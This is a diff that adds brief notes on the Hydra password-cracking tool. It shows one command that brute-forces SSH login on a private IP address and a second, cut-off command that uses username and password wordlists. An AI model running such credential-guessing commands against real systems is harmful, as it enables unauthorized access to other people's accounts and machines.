@@ -1,0 +1,6 @@
+#awesome tool for cracking passwords
+#and here are hydra hacking tips
+
+hydra -l username -p passwd 192.168.43.123 ssh  //crack ssh on 192.168.43.123 using username and password passwd
+
+hydra -L name.lst -P pass.lst 
